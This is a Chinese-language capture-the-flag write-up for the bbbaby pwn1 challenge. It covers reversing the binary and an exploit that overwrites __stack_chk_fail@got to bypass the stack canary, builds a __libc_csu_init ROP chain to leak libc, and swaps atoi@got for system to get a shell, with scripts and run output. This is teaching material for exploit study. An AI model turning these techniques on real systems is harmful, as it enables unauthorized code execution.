# Speedrun：bbbaby pwn1（8 字节任意写 + canary 绕过 + ret2libc）

> 题型：**任意地址写 8 字节** + **可控长度栈溢出（canary）**
> 亮点：不用 leak canary，而是把 `__stack_chk_fail@got` 改成 `leave; ret`，
> 让“canary 校验失败”反过来变成我们的栈迁移入口
> 出处：陇原战“疫”2021 网络安全大赛 bbbaby（原目录 `[陇原战"疫"2021网络安全大赛]bbbaby/pwn1`）

---

## 0. 一句话结论

```text
64 位、No PIE、NX、partial RELRO、有 canary、stripped、6.4KB

read_int()  @ 0x4007c7   读 10 字节到 [rbp-0x20]，遇 '\n' 截断，return atoi(buf)
main()      @ 0x40090b   sub rsp,0x120；buf = rbp-0x110；canary = rbp-0x8
  case 0 @ 0x40086c: puts("address:"); n = read_int();
                     read(0, (void*)n, 8);        <-- 任意地址写 8 字节
  case 1 @ 0x4008bb: puts("size:");    n = read_int(); puts("content:");
                     read(0, buf, n);             <-- 长度可控的栈溢出
  case 其它:           return                   <-- 触发 main 的 canary 校验与 ret

四步：
1) case 0: [0x601020] = 0x40086a             __stack_chk_fail@got -> leave; ret
2) case 1: buf 溢出到 saved rbp/ret，填 ROP；再选 2 让 main return
   canary 校验失败 -> 跳到 leave; ret -> 直接用我们覆盖的返回地址执行
3) ROP（__libc_csu_init 传参）: puts(read@got) -> main     （leak libc）
4) case 0: [0x601040] = system               atoi@got -> system
   菜单里发 "/bin/sh" -> read_int 里的 atoi(buf) 变成 system("/bin/sh")
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

file bbbaby_pwn1
readelf -hW bbbaby_pwn1 | grep Type          # EXEC -> No PIE
readelf -lW bbbaby_pwn1 | grep GNU_STACK     # RW  -> NX
readelf -dW bbbaby_pwn1 | grep BIND_NOW      # 无  -> partial RELRO（.got.plt 可写）
objdump -R bbbaby_pwn1                       # GOT 地址表
strings -tx bbbaby_pwn1 | sed -n '1,12p'
objdump -d -M intel bbbaby_pwn1 | sed -n '/40090b:/,/40099e/p'
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, statically? 否 -> dynamically linked, stripped

DYNAMIC RELOCATION RECORDS
0000000000601018 R_X86_64_JUMP_SLOT  puts
0000000000601020 R_X86_64_JUMP_SLOT  __stack_chk_fail
0000000000601028 R_X86_64_JUMP_SLOT  read
0000000000601030 R_X86_64_JUMP_SLOT  __libc_start_main
0000000000601040 R_X86_64_JUMP_SLOT  atoi
0000000000601048 R_X86_64_JUMP_SLOT  exit

strings: error / address: / content: / size: / your choice
```

读法：

| 观察 | 结论 |
| --- | --- |
| `read(0, (void*)n, 8)`，n 来自 `atoi` | 8 字节任意地址写；`read` 只发几个字节就是部分覆写 |
| `read(0, buf, n)`，n 来自 `atoi` | 长度完全可控 → 溢出到 saved rip |
| 有 `__stack_chk_fail`、buf 到 canary 0x108 | 直接溢出会被 abort，必须处理 canary |
| partial RELRO | `.got.plt`（0x601000+）可写，任意写就能改 GOT |
| 只有 `puts/read/setvbuf/atoi/exit`，没有 `system` | 需要 leak libc（或 GOT 二次利用） |

---

## 2. 关键逆向

### 2.1 `read_int` —— 所有数字输入都走它

```asm
4007c7: push rbp; mov rbp,rsp; sub rsp,0x30
4007cf: mov rax, fs:0x28 ; mov [rbp-0x8], rax      # canary
4007de: mov DWORD PTR [rbp-0x28],0                 # i = 0
4007e7: read(0, &c, 1)                             # 一次一个字节
400823: cmp al, 0xa ; jne store
400827: mov BYTE PTR [rbp+rax-0x20],0              # buf[i] = 0（遇 '\n' 截断）
400833: buf[i++] = c
400844: cmp i, 9 ; jle loop                        # 最多 10 字节
400851: call atoi(buf)                             # 返回值给调用者
400856: 校验 canary -> __stack_chk_fail
```

- 返回值就是菜单选择 / 写地址 / 写长度。
- `atoi` 只认十进制（`strtol` 的十进制前缀），所以脚本里地址要发 `str(0x601020)` 而不是十六进制串。

### 2.2 `main` —— 两个危险分支

```asm
40090b: push rbp; mov rbp,rsp; sub rsp,0x120
400916: mov rax, fs:0x28 ; mov [rbp-0x8], rax      # main 自己的 canary
400943: call read_int                              # 菜单选择

40086c:  puts("address:");  n = read_int()
40089c:  cdqe; mov edx,8; mov rsi,rax; mov edi,0
4008b3:  call read                           # read(0, n, 8)  任意写

4008bb:  puts("size:");     n = read_int()   # 注意这是另一个函数，rdi = &main_buf
4008c3:  mov [rbp-0x18], rdi                 # dest = main 的 buf
4008ce:  puts("size:");  n = read_int();  puts("content:")
4008ef:  mov edx,[rbp-0x4]; mov rax,[rbp-0x18]; mov rsi,rax; mov edi,0
400903:  call read                           # read(0, main_buf, n)  可控溢出
```

栈布局（main 帧）：

```text
rbp-0x110  buf[0x108]     <-- case 1 的写入起点
rbp-0x008  canary
rbp+0x000  saved rbp
rbp+0x008  saved rip      <-- 目标
```

### 2.3 为什么“改 `__stack_chk_fail@got`”能绕 canary

`__stack_chk_fail` 是在 canary 校验失败时**主动调用**的函数：

```asm
400988: mov rdx,[rbp-0x8]
40098c: xor rdx, fs:0x28
400995: je  40099c
400997: call 400600 <__stack_chk_fail@plt>   # 失败路径
40099c: leave ; ret
```

`__stack_chk_fail@plt` 就是 `jmp [0x601020]`。把它改成 `leave; ret`：

```text
canary 校验失败 -> call 0x400600 -> jmp [0x601020] = 0x40086a (leave; ret)
此时 rbp 仍是 main 的 rbp，而 saved rbp/ret 已被我们溢出覆盖
leave: rsp = rbp; pop rbp(=乱填); ret -> 执行我们铺的 ROP
```

也就是说：**canary 失败不再是终止条件，而是栈迁移的触发点**。

---

## 3. ROP：没有 `pop rdi` 就用 `__libc_csu_init`

二进制里没有 `pop rdi; ret`（只有 `_start` 里的 `pop rsi`），但 `__libc_csu_init` 完整：

```asm
4009fa: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
4009e0: mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call QWORD PTR [r12+rbx*8]
4009ed: add rbx,1 ; cmp rbx,rbp ; jne 4009e0
4009f6: add rsp,8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

调用 `[fn_got](a1, a2, a3)` 的布局：

```python
chain = [
    CSU_POP,      # 0x4009fa
    0, 1,         # rbx=0, rbp=1 -> 只循环一次
    fn_got,       # r12：call [r12+rbx*8]
    a3, a2, a1,   # r13=rdx, r14=rsi, r15=edi
    CSU_CALL,     # 0x4009e0
    0,0,0,0,0,0,0,# add rsp,8 + 6 个 pop
    ret_to,
]
```

- `edi` 只有 32 位：参数是地址（`0x601028`）时没问题；传 64 位指针会被截断。
- `[fn_got]` 是**懒绑定**的也不影响：`call [puts@got]` 会走 `puts@plt` 的 `push 0; jmp PLT0` 完成解析再调用。

第一轮 ROP：

```python
overflow(p, csu_call(PUTS_GOT, READ_GOT))   # puts(read@got) 然后回 main
menu(p, 2)                                  # 让 main return -> 触发 canary 失败
```

泄漏解析要注意：`recvuntil("your choice")` 之后缓冲区开头会残留上一个提示的 `\n`，
`data.split(b"\n")[0]` 会拿到空串。做法是**挑出能让 libc 页对齐的那一段**：

```python
for seg in data.split(b"\n"):
    if len(seg) >= 6:
        cand = u64(seg.ljust(8, b"\x00"))
        if (cand - libc.symbols["read"]) & 0xFFF == 0:
            return cand
```

---

## 4. 第二轮：不需要第二次 ROP

拿到 `system` 之后，用同一个任意写把 `atoi@got` 改掉即可：

```python
p.sendline(b"0")                                   # 此时菜单提示已被消费
p.sendlineafter(b"address:", str(ATOI_GOT).encode())
p.send(p64(system))                                # [0x601040] = system
p.sendlineafter(MENU, b"/bin/sh")                  # read_int -> atoi("/bin/sh")
```

`read_int` 返回前一定会 `atoi(buf)`，所以这一发 `/bin/sh` 直接变成 `system("/bin/sh")`，
省掉了第二次栈溢出。

地址表：

```text
main              = 0x40090b
leave; ret        = 0x40086a
csu pop  gadget   = 0x4009fa
csu call gadget   = 0x4009e0
puts@got          = 0x601018
__stack_chk_fail@got = 0x601020
read@got          = 0x601028
atoi@got          = 0x601040
buf -> saved rbp  = 0x110
```

---

## 5. 交互脚本骨架

```python
MENU = b"your choice"

def write8(p, addr, data):          # case 0
    p.sendlineafter(MENU, b"0")
    p.sendlineafter(b"address:", str(addr).encode())
    p.send(data.ljust(8, b"\x00"))  # read 8 字节；只发 1~7 字节就是部分覆写

def overflow(p, chain):             # case 1
    payload = b"A" * 0x108 + b"B" * 8 + b"C" * 8 + flat(chain)
    p.sendlineafter(MENU, b"1")
    p.sendlineafter(b"size:", str(len(payload)).encode())
    p.sendafter(b"content:", payload)
```

完整可运行版本见 `20_bbbaby_pwn1_exp.py`。

---

## 6. 本地 / 远程验证

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

echo 'flag{BB_LOCAL}' > flag.txt
python 20_bbbaby_pwn1_exp.py LOCAL        # 用本机 libc
rm -f flag.txt
```

正确输出：

```text
menu output: b'\n\x10\x81\x12\xc6Pt\n^_^\nyour choice'
[+] read=0x7450c6128110 libc=0x7450c6000000 system=0x7450c605c2e0
__PWNED__
flag{BB_LOCAL}

[+] OK: __PWNED__
```

远程（附件带 `libc-2.23.so`）：

```bash
LIBC=./libc-2.23.so HOST=target.example.com PORT=9999 \
python 20_bbbaby_pwn1_exp.py
```

---

## 7. 坑点清单

1. **`csu pop` gadget 是 `0x4009fa`，不是 `0x400a0a`**
   `0x400a0a` 是 `__libc_csu_init` 尾部的对齐填充（`test al,[rax]`），跳过去直接 SIGSEGV。
   `0x4009fa` 才是 `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`。

2. **地址要用十进制发** `read_int` 内部是 `atoi`，`0x601020` 这种字符串会被解析成 0，
   然后 `read(0, NULL, 8)` 直接崩。

3. **`recvuntil(MENU)` 之后不要再用 `sendlineafter(MENU, ...)`**
   提示字符已经被读走，第二次等 `MENU` 会永久阻塞。此时直接 `sendline(b"0")`。

4. **leak 解析要跳过残留 `\n`**
   `data.split(b"\n")[0]` 可能是空串；按“能让 libc 页对齐”的规则筛。

5. **`read(0, n, 8)` 是精确读**：发满 8 字节即可；不足 8 字节就是部分覆写（同样有用）。

6. **必须先改 `__stack_chk_fail@got` 再溢出**
   顺序反了会被真正的 `__stack_chk_fail` 直接 abort（`*** stack smashing detected ***`）。

7. **第二轮不用再溢出**：`atoi@got -> system` 之后 `/bin/sh` 就是命令。

---

## 8. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `readelf`：No PIE / NX / partial RELRO / canary，6.4KB |
| 0:20–0:40 | `strings`：`address:` / `content:` / `size:` → 猜“任意写 + 可控长度读” |
| 0:40–1:00 | 反汇编：`read(0,(void*)n,8)` 与 `read(0,buf,n)`，buf 在 `rbp-0x110` |
| 1:00–1:20 | 注意 `call __stack_chk_fail` + `.got.plt` 可写 → 改成 `leave; ret` 绕 canary |
| 1:20–1:40 | 找 gadget：没有 `pop rdi` → 用 `__libc_csu_init`（`0x4009fa` / `0x4009e0`） |
| 1:40–1:55 | ROP: `puts(read@got)` → `main`，解析 leak 时跳过残留换行 |
| 1:55–2:10 | `atoi@got = system`，发 `/bin/sh`，`cat flag*` |

---

## 9. 题型识别卡

```text
有 canary，但同时存在“任意地址写”或“可控长度读”这类更底层的原语
= 别急着找 canary leak：先看能不能把 __stack_chk_fail@got 改成 leave;ret
  （或改成 main / 一个栈迁移 gadget），让校验失败路径变成我们的入口
```

一句话：**用 8 字节任意写把 `__stack_chk_fail@got` 换成 `leave;ret`，canary 失败就从栈迁移开始执行 CSU ROP；leak 到 libc 后再把 `atoi@got` 换成 `system`，菜单里发 `/bin/sh` 即得 shell。**
